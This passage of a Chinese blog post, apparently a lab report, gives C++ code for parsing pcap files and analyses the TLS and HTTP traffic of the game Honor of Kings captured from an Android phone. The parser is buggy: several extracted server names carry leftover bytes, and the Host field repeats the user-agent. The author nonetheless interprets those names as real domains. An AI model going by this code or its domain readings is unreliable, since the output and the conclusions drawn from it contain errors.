class="built_in">fclose</span>(fder);</span><br><span class="line">                            <span class="comment">//printf(&quot;%d:\n&quot;,i);</span></span><br><span class="line">                            <span class="comment">//解析证书</span></span><br><span class="line">                            <span class="comment">//https://www.openssl.net.cn/docs/174.html</span></span><br><span class="line">                            <span class="built_in">ParseDerCertificate</span>(fparse,certificate_len);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fclose</span>(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过字符串开头字符和结尾字符进行内容获取</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetStringByHeadAndTail</span><span class="params">(FILE *fp,<span class="type">char</span> *head_str,<span class="type">char</span> *tail_str,<span class="type">char</span> *buf,<span class="type">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="comment">//申明变量</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> offset;</span><br><span class="line">    <span class="type">int</span> head_len,tail_len,buf_len = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> head_tmp[STRSIZE],tail_tmp[STRSIZE];</span><br><span class="line">    <span class="comment">//初始化</span></span><br><span class="line">    <span class="built_in">memset</span>(head_tmp, <span class="number">0</span>, <span class="built_in">sizeof</span>(head_tmp));</span><br><span class="line">    <span class="built_in">memset</span>(tail_tmp, <span class="number">0</span>, <span class="built_in">sizeof</span>(tail_tmp));</span><br><span class="line">    head_len = <span class="built_in">strlen</span>(head_str);</span><br><span class="line">    tail_len = <span class="built_in">strlen</span>(tail_str);</span><br><span class="line">    <span class="comment">//记录当前偏移</span></span><br><span class="line">    offset = <span class="built_in">ftell</span>(fp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    匹配开头字符</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">while</span>((head_tmp[<span class="number">0</span>] = <span class="built_in">fgetc</span>(fp)) != EOF)&#123;</span><br><span class="line">        <span class="comment">//开头字符不存在</span></span><br><span class="line">        <span class="keyword">if</span>((<span class="built_in">ftell</span>(fp) - offset) &gt; len)&#123;</span><br><span class="line">            <span class="comment">//cout&lt;&lt;&quot;[-] Result: Can&#x27;t find string: &quot;&lt;&lt;head_str&lt;&lt;endl;</span></span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//匹配到开头字符</span></span><br><span class="line">        <span class="keyword">if</span>(head_tmp[<span class="number">0</span>] == *head_str)&#123;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">1</span>; i &lt; head_len; i++)&#123;</span><br><span class="line">                head_tmp[i] = <span class="built_in">fgetc</span>(fp);</span><br><span class="line">                <span class="keyword">if</span>(head_tmp[i] != *(head_str+i)) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i == head_len) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    匹配结尾字符</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">while</span>((tail_tmp[<span class="number">0</span>] = <span class="built_in">fgetc</span>(fp)) != EOF)&#123;</span><br><span class="line">        <span class="comment">//结尾字符不存在</span></span><br><span class="line">        <span class="keyword">if</span>((<span class="built_in">ftell</span>(fp) - offset) &gt; len)&#123;</span><br><span class="line">            <span class="comment">//cout&lt;&lt;&quot;[-] Result: Can&#x27;t find string: &quot;&lt;&lt;tail_str&lt;&lt;endl;</span></span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//匹配到结尾字符</span></span><br><span class="line">        buf[buf_len++] = tail_tmp[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(tail_tmp[<span class="number">0</span>] == *tail_str)&#123;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">1</span>; i &lt; tail_len;i++)&#123;</span><br><span class="line">                tail_tmp[i] = <span class="built_in">fgetc</span>(fp);</span><br><span class="line">                <span class="keyword">if</span>(tail_tmp[i] != *(tail_str+i))&#123;</span><br><span class="line">                    <span class="comment">//如果没匹配成功，清除buf内容</span></span><br><span class="line">                    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="built_in">sizeof</span>(buf));</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i == tail_len)&#123;</span><br><span class="line">                buf[buf_len<span class="number">-1</span>] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//回到初始偏移指针位置</span></span><br><span class="line">    <span class="built_in">fseek</span>(fp,offset,SEEK_SET);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//处理数据头</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">GetHeader</span><span class="params">(FILE *fp,pcap_file_header *file_header,pcap_pkt_header *pkt_header,FrameHeader *eth_header,</span></span></span><br><span class="line"><span class="params"><span class="function">    IPHeader *ip_header,TCPHeader *tcp_header,UDPHeader *udp_header)</span></span>&#123;</span><br><span class="line">    <span class="type">bool</span> GetHeaderError = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">//帧空间重置</span></span><br><span class="line">    <span class="built_in">memset</span>(pkt_header,<span class="number">0</span>,<span class="built_in">sizeof</span>(pcap_pkt_header));</span><br><span class="line">    <span class="built_in">memset</span>(eth_header,<span class="number">0</span>,<span class="built_in">sizeof</span>(FrameHeader));</span><br><span class="line">    <span class="built_in">memset</span>(ip_header,<span class="number">0</span>,<span class="built_in">sizeof</span>(IPHeader));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//读取pcap包头结构，无要求数据，不作处理</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">fread</span>(pkt_header,<span class="number">16</span>,<span class="number">1</span>,fp) != <span class="number">1</span>) GetHeaderError = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">//读取数据帧结构，无要求数据，不作处理</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">fread</span>(eth_header,<span class="number">14</span>,<span class="number">1</span>,fp) != <span class="number">1</span>) GetHeaderError = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">//读取IP数据报头结构，获取src_ip、dst_ip</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">fread</span>(ip_header, <span class="built_in">sizeof</span>(IPHeader),<span class="number">1</span>,fp) != <span class="number">1</span>) GetHeaderError = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">//读取TCP数据报头结构，获取src_port、dst_port</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">fread</span>(tcp_header,<span class="built_in">sizeof</span>(TCPHeader),<span class="number">1</span>,fp) != <span class="number">1</span>) GetHeaderError = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">//读取TLS数据报头结构，获取TLS相关内容</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> GetHeaderError;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//重组TCP报文获取证书（只对连续的包）</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetCertificateByReassembledTCP</span><span class="params">(FILE *fp,u_int8 *buf,<span class="type">int</span> next_pkt_offset,<span class="type">int</span> tol_certificate_len,<span class="type">int</span> ack_value)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> offset = <span class="built_in">ftell</span>(fp);</span><br><span class="line">    <span class="keyword">while</span>(i &lt; tol_certificate_len)&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">ftell</span>(fp) &lt; next_pkt_offset &amp;&amp; i &lt; tol_certificate_len)</span><br><span class="line">            buf[i++] = <span class="built_in">fgetc</span>(fp);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">GetHeader</span>(fp,file_header,pkt_header,eth_header,ip_header,tcp_header,udp_header)) <span class="keyword">return</span> ;</span><br><span class="line">        <span class="keyword">if</span> (tcp_header-&gt;AckNO != ack_value) <span class="keyword">return</span> ;</span><br><span class="line">        next_pkt_offset += <span class="number">16</span> + pkt_header-&gt;caplen;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解析DER证书内容</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ParseDerCertificate</span><span class="params">(FILE * fp,<span class="type">int</span> certificate_len)</span></span>&#123;</span><br><span class="line">    X509 *x;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[<span class="number">5000</span>],*p;</span><br><span class="line">    <span class="type">int</span> len,ret;</span><br><span class="line">    BIO *b;</span><br><span class="line">    fp=<span class="built_in">fopen</span>(<span class="string">&quot;tmp.der&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;[!]Error: Can&#x27;t Parse Certificate File!&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    len=<span class="built_in">fread</span>(buf,<span class="number">1</span>,<span class="number">5000</span>,fp);</span><br><span class="line">    <span class="built_in">fclose</span>(fp);</span><br><span class="line">    p=buf;</span><br><span class="line">    x=<span class="built_in">X509_new</span>();</span><br><span class="line">    <span class="built_in">d2i_X509</span>(&amp;x,(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> **)&amp;p,len);</span><br><span class="line">    b=<span class="built_in">BIO_new</span>(<span class="built_in">BIO_s_file</span>());</span><br><span class="line">    <span class="built_in">BIO_set_fp</span>(b,stdout,BIO_NOCLOSE);</span><br><span class="line">    <span class="comment">//ret=X509_print(b,x);</span></span><br><span class="line">    <span class="built_in">BIO_free</span>(b);</span><br><span class="line">    <span class="built_in">X509_free</span>(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译代码</p>
+<p><code>g++ main.cpp -w -lssl -lcrypto</code></p>
+<p>使用代码</p>
+<p><code>./a.out wzry.pcap</code></p>
+<h4 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h4><p><strong>明文协议数据提取内容</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">55:user_agent: Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30 5G Build/RKQ1.200826.002)</span><br><span class="line">55:Host: Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30 5G Build/RKQ1.200826.002)</span><br><span class="line">55:Content-Type:</span><br><span class="line">326:user_agent: Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30 5G Build/RKQ1.200826.002)</span><br><span class="line">326:Host: Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30 5G Build/RKQ1.200826.002)</span><br><span class="line">326:Content-Type:</span><br><span class="line">386:user_agent: Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30 5G Build/RKQ1.200826.002)</span><br><span class="line">386:Host: Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30 5G Build/RKQ1.200826.002)</span><br><span class="line">386:Content-Type: application/x-www-form-urlencoded</span><br><span class="line">387:user_agent:</span><br><span class="line">387:Host:</span><br><span class="line">387:Content-Type:</span><br><span class="line">849:user_agent: Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30 5G Build/RKQ1.200826.002)</span><br><span class="line">849:Host: Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30 5G Build/RKQ1.200826.002)</span><br><span class="line">849:Content-Type:</span><br><span class="line">851:user_agent: Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30 5G Build/RKQ1.200826.002)</span><br><span class="line">851:Host: Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30 5G Build/RKQ1.200826.002)</span><br><span class="line">851:Content-Type:</span><br><span class="line">1653:user_agent: Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30 5G Build/RKQ1.200826.002)</span><br><span class="line">1653:Host: Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30 5G Build/RKQ1.200826.002)</span><br><span class="line">1653:Content-Type:</span><br><span class="line">1843:user_agent: Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30 5G Build/RKQ1.200826.002)</span><br><span class="line">1843:Host: Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30 5G Build/RKQ1.200826.002)</span><br><span class="line">1843:Content-Type:</span><br><span class="line">1885:user_agent: Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30 5G Build/RKQ1.200826.002)</span><br><span class="line">1885:Host: Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30 5G Build/RKQ1.200826.002)</span><br><span class="line">1885:Content-Type:</span><br><span class="line">1954:user_agent: Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30 5G Build/RKQ1.200826.002)</span><br><span class="line">1954:Host: Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30 5G Build/RKQ1.200826.002)</span><br><span class="line">1954:Content-Type:</span><br></pre></td></tr></table></figure>
+
+<p>根据UA可以看出采集数据的手机型号为Redmi K30 5G，系统为Android 11</p>
+<p>明文协议中只有一次（386）获取到了Content-Type，内容为application&#x2F;x-www-form-urlencoded</p>
+<p><strong>密文协议数据提取内容</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">8:SeverName:adv.sec.miui.com</span><br><span class="line">63:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">63:SeverName:cgi.connect.qq.com</span><br><span class="line">75:CipherSuites:c030,c02c,c028,c024,c014,c00a,00a3,009f,006b,006a,0039,0038,c032,c02e,c02a,c026,c00f,c005,009d,003d,0035,c02f,c02b,c027,c023,c013,c009,00a2,009e,0067,0040,0033,0032,c031,c02d,c029,c025,c00e,c004,009c,003c,002f,c012,c008,0016,0013,c00d,c003,000a,00ff</span><br><span class="line">75:SeverName:a.ssl.msdk.qq.comm</span><br><span class="line">83:CipherSuites:c030,c02c,c028,c024,c014,c00a,00a3,009f,006b,006a,0039,0038,c032,c02e,c02a,c026,c00f,c005,009d,003d,0035,c02f,c02b,c027,c023,c013,c009,00a2,009e,0067,0040,0033,0032,c031,c02d,c029,c025,c00e,c004,009c,003c,002f,c012,c008,0016,0013,c00d,c003,000a,00ff</span><br><span class="line">83:SeverName:a.ssl.msdk.qq.comm</span><br><span class="line">141:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">141:SeverName:cloudctrl.gcloud.qq.com</span><br><span class="line">164:CipherSuites:c030,c02c,c028,c024,c014,c00a,00a3,009f,006b,006a,0039,0038,c032,c02e,c02a,c026,c00f,c005,009d,003d,0035,c02f,c02b,c027,c023,c013,c009,00a2,009e,0067,0040,0033,0032,c031,c02d,c029,c025,c00e,c004,009c,003c,002f,c012,c008,0016,0013,c00d,c003,000a,00ff</span><br><span class="line">164:SeverName:a.ssl.msdk.qq.comqq.com</span><br><span class="line">216:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">216:SeverName:log.tbs.qq.comcomqq.com</span><br><span class="line">337:CipherSuites:c030,c02c,c028,c024,c014,c00a,00a3,009f,006b,006a,0039,0038,c032,c02e,c02a,c026,c00f,c005,009d,003d,0035,c02f,c02b,c027,c023,c013,c009,00a2,009e,0067,0040,0033,0032,c031,c02d,c029,c025,c00e,c004,009c,003c,002f,c012,c008,0016,0013,c00d,c003,000a,00ff</span><br><span class="line">337:SeverName:a.ssl.msdk.qq.comqq.com</span><br><span class="line">358:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">358:SeverName:dlied5.qq.com.comqq.com</span><br><span class="line">445:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">445:SeverName:kohcloud.tgpa.qq.comcom</span><br><span class="line">551:CipherSuites:009d,c09d,003d,0035,c0a1,009c,c09c,003c,002f,c0a0,000a,00ad,00b7,0095,00ac,00b6,0094,0093,00a9,c0a5,00af,008d,c0a9,00a8,c0a4,00ae,008c,c0a8,008b,00ff</span><br><span class="line">551:SeverName:down.anticheatexpert.com</span><br><span class="line">572:CipherSuites:009d,c09d,003d,0035,c0a1,009c,c09c,003c,002f,c0a0,000a,00ad,00b7,0095,00ac,00b6,0094,0093,00a9,c0a5,00af,008d,c0a9,00a8,c0a4,00ae,008c,c0a8,008b,00ff</span><br><span class="line">572:SeverName:down.anticheatexpert.com</span><br><span class="line">598:CipherSuites:009d,c09d,003d,0035,c0a1,009c,c09c,003c,002f,c0a0,000a,00ad,00b7,0095,00ac,00b6,0094,0093,00a9,c0a5,00af,008d,c0a9,00a8,c0a4,00ae,008c,c0a8,008b,00ff</span><br><span class="line">598:SeverName:down.anticheatexpert.com</span><br><span class="line">624:CipherSuites:009d,c09d,003d,0035,c0a1,009c,c09c,003c,002f,c0a0,000a,00ad,00b7,0095,00ac,00b6,0094,0093,00a9,c0a5,00af,008d,c0a9,00a8,c0a4,00ae,008c,c0a8,008b,00ff</span><br><span class="line">624:SeverName:down.anticheatexpert.com</span><br><span class="line">658:CipherSuites:c030,c02c,c028,c024,c014,c00a,00a3,009f,006b,006a,0039,0038,c032,c02e,c02a,c026,c00f,c005,009d,003d,0035,c02f,c02b,c027,c023,c013,c009,00a2,009e,0067,0040,0033,0032,c031,c02d,c029,c025,c00e,c004,009c,003c,002f,c012,c008,0016,0013,c00d,c003,000a,00ff</span><br><span class="line">658:SeverName:a.ssl.msdk.qq.comert.com</span><br><span class="line">698:CipherSuites:c030,c02c,c028,c024,c014,c00a,00a3,009f,006b,006a,0039,0038,c032,c02e,c02a,c026,c00f,c005,009d,003d,0035,c02f,c02b,c027,c023,c013,c009,00a2,009e,0067,0040,0033,0032,c031,c02d,c029,c025,c00e,c004,009c,003c,002f,c012,c008,0016,0013,c00d,c003,000a,00ff</span><br><span class="line">698:SeverName:a.ssl.msdk.qq.comert.com</span><br><span class="line">700:CipherSuites:c030,c02c,c028,c024,c014,c00a,00a3,009f,006b,006a,0039,0038,c032,c02e,c02a,c026,c00f,c005,009d,003d,0035,c02f,c02b,c027,c023,c013,c009,00a2,009e,0067,0040,0033,0032,c031,c02d,c029,c025,c00e,c004,009c,003c,002f,c012,c008,0016,0013,c00d,c003,000a,00ff</span><br><span class="line">700:SeverName:a.ssl.msdk.qq.comert.com</span><br><span class="line">740:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">740:SeverName:flow.qq.comqq.comert.com</span><br><span class="line">1004:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">1004:SeverName:szmg.qq.comqq.comert.com</span><br><span class="line">1182:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">1182:SeverName:portal.xunyou.mobirt.com</span><br><span class="line">1222:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">1222:SeverName:portal.xunyou.mobirt.com</span><br><span class="line">1225:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">1225:SeverName:portal.xunyou.mobirt.com</span><br><span class="line">1230:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">1230:SeverName:portal.xunyou.mobirt.com</span><br><span class="line">1383:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">1383:SeverName:portal.xunyou.mobirt.com</span><br><span class="line">1388:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">1388:SeverName:portal.xunyou.mobirt.com</span><br><span class="line">1405:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">1405:SeverName:portal.xunyou.mobirt.com</span><br><span class="line">1420:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">1420:SeverName:portal.xunyou.mobirt.com</span><br><span class="line">1431:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">1431:SeverName:szmg.qq.comou.mobirt.com</span><br><span class="line">1491:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">1491:SeverName:szmg.qq.comou.mobirt.com</span><br><span class="line">1509:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">1509:SeverName:log.tbs.qq.commobirt.com</span><br><span class="line">1706:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">1706:SeverName:yxzj.pandora.game.qq.com</span><br><span class="line">1892:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">1892:SeverName:idcconfig.gcloudsdk.comm</span><br><span class="line">1925:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">1925:SeverName:op.tga.qq.comoudsdk.comm</span><br><span class="line">1959:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">1959:SeverName:app.ingame.qq.comdk.comm</span><br><span class="line">2008:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">2008:SeverName:report.tga.qq.comdk.comm</span><br><span class="line">2011:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">2011:SeverName:op.tga.qq.com.comdk.comm</span><br><span class="line">2213:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">2213:SeverName:game.weixin.qq.comk.comm</span><br><span class="line">2288:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">2288:SeverName:log.tbs.qq.com.comk.comm</span><br><span class="line">2293:CipherSuites:1301,1302,1303,c02b,c02c,cca9,c02f,c030,cca8,c009,c00a,c013,c014,009c,009d,002f,0035</span><br><span class="line">2293:SeverName:sdk.xyapi.game.qq.comomm</span><br></pre></td></tr></table></figure>
+
+<p>解密协议的结果如上，可以看出CipherSuites为加密方式，其中的每个编码都对应一种加密的方式。根据SeverName，我们可以大致推断出这一段流量的行为。</p>
+<ol>
+<li>adv.sec.miui.com，小米的广告，推测是根据小米商城下载的“王者荣耀”版本自动发出的请求</li>
+<li>cgi.connect.qq.com，qq的公共网关接口，开始联入qq服务器</li>
+<li>a.ssl.msdk.qq.comm，腾讯开发平台针对第三方手游开发团队提供的一个公共组件和服务库，应该是登录界面，可以选择QQ或者微信登入</li>
+<li>log.tbs.qq.comcomqq.com，是腾讯网页和应用调试工具的日志</li>
+<li>dlied5.qq.com.comqq.com，腾讯下的一个二级域名，查询了一下是安装包更新请求</li>
+<li>flow.qq.comqq.comert.com，QQ音乐服务器，加载背景音乐</li>
+<li>szmg.qq.comqq.comert.com，未知</li>
+<li>portal.xunyou.mobirt.com，迅游加速器，应该是腾讯的合作商</li>
+<li>yxzj.pandora.game.qq.com，未知，看缩写应该是“游戏主机”</li>
+<li>idcconfig.gcloudsdk.comm，互联网数据中心配置，好像还是谷歌云的.</li>
+<li>XXX.tga.qq.comoudsdk.comm，腾讯TGA平台的网站</li>
+<li>game.weixin.qq.comk.comm，微信区的服务器</li>
+<li>sdk.xyapi.game.qq.comomm，开始请求游戏的API</li>
+</ol>
+<p>以上是根据“王者荣耀”TLS协议推测出的流程，大致符合对手机执行对应操作时所捕获流量包的行为分析</p>
+<p><strong>证书数据提取数据</strong></p>
+<p>证书经过代码重组报文和提取数据之后，采用的是openssl库的api解析，可以得到全部的证书项目内容，为了满足要求且具有高的可读性，在命令行中执行下列命令</p>
+<p><img src="/%5Cimages%5CLily_Screenshot_1617889619.png"></p>
+<p><code>./a.out wzry.pcap | grep &quot;Issuer:\|Subject:\|^[0-9]&quot;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">72:</span><br><span class="line">        Issuer: C=US, O=DigiCert Inc, CN=DigiCert Secure Site CN CA G3</span><br><span class="line">        Subject: C=CN, ST=Guangdong Province, L=Shenzhen, O=Shenzhen Tencent Computer Systems Company Limited, CN=*.connect.qq.com</span><br><span class="line">72:</span><br><span class="line">        Issuer: C=US, O=DigiCert Inc, OU=www.digicert.com, CN=DigiCert Global Root CA</span><br><span class="line">        Subject: C=US, O=DigiCert Inc, CN=DigiCert Secure Site CN CA G3</span><br><span class="line">100:</span><br><span class="line">        Issuer: C=US, O=DigiCert Inc, CN=DigiCert Global CA G2</span><br><span class="line">        Subject: C=CN, ST=Guangdong Province, L=Shenzhen, O=Shenzhen Tencent Computer Systems Company Limited, CN=ssl.msdk.qq.com</span><br><span class="line">100:</span><br><span class="line">        Issuer: C=US, O=DigiCert Inc, OU=www.digicert.com, CN=DigiCert Global Root G2</span><br><span class="line">        Subject: C=US, O=DigiCert Inc, CN=DigiCert Global CA G2</span><br><span class="line">100:</span><br><span class="line">        Issuer: C=US, O=VeriSign, Inc., OU=VeriSign Trust Network, OU=(c) 2006 VeriSign, Inc. - For authorized use only, CN=VeriSign Class 3 Public Primary Certification Authority - G5</span><br><span class="line">        Subject: C=US, O=DigiCert Inc, OU=www.digicert.com, CN=DigiCert Global Root G2</span><br><span class="line">227:</span><br><span class="line">        Issuer: C=BE, O=GlobalSign nv-sa, CN=GlobalSign Organization Validation CA - SHA256 - G2</span><br><span class="line">        Subject: C=CN, ST=guangdong, L=shenzhen, O=Tencent Technology (Shenzhen) Company Limited, CN=*.jun04.sparta.3g.qq.com</span><br><span class="line">227:</span><br><span class="line">        Issuer: C=BE, O=GlobalSign nv-sa, OU=Root CA, CN=GlobalSign Root CA</span><br><span class="line">        Subject: C=BE, O=GlobalSign nv-sa, CN=GlobalSign Organization Validation CA - SHA256 - G2</span><br><span class="line">227:</span><br><span class="line">        Issuer: C=BE, O=GlobalSign nv-sa, OU=Root CA, CN=GlobalSign Root CA</span><br><span class="line">        Subject: C=BE, O=GlobalSign nv-sa, OU=Root CA, CN=GlobalSign Root CA</span><br><span class="line">339:</span><br><span class="line">        Issuer: C=US, O=DigiCert Inc, CN=DigiCert Global CA G2</span><br><span class="line">        Subject: C=CN, ST=Guangdong Province, L=Shenzhen, O=Shenzhen Tencent Computer Systems Company Limited, CN=ssl.msdk.qq.com</span><br><span class="line">339:</span><br><span class="line">        Issuer: C=US, O=DigiCert Inc, OU=www.digicert.com, CN=DigiCert Global Root G2</span><br><span class="line">        Subject: C=US, O=DigiCert Inc, CN=DigiCert Global CA G2</span><br><span class="line">339:</span><br><span class="line">        Issuer: C=US, O=VeriSign, Inc., OU=VeriSign Trust Network, OU=(c) 2006 VeriSign, Inc. - For authorized use only, CN=VeriSign Class 3 Public Primary Certification Authority - G5</span><br><span class="line">        Subject: C=US, O=DigiCert Inc, OU=www.digicert.com, CN=DigiCert Global Root G2</span><br><span class="line">553:</span><br><span class="line">        Issuer: C=US, O=DigiCert Inc, CN=DigiCert Basic RSA CN CA G2</span><br><span class="line">        Subject: C=CN, ST=\xE7\xA6\x8F\xE5\xBB\xBA\xE7\x9C\x81, L=\xE5\x8E\xA6\xE9\x97\xA8\xE5\xB8\x82, O=\xE7\xBD\x91\xE5\xAE\xBF\xE7\xA7\x91\xE6\x8A\x80\xE8\x82\xA1\xE4\xBB\xBD\xE6\x9C\x89\xE9\x99\x90\xE5\x85\xAC\xE5\x8F\xB8\xE5\x8E\xA6\xE9\x97\xA8\xE5\x88\x86\xE5\x85\xAC\xE5\x8F\xB8, CN=livessl.chinanetcenter.com</span><br><span class="line">553:</span><br><span class="line">        Issuer: C=US, 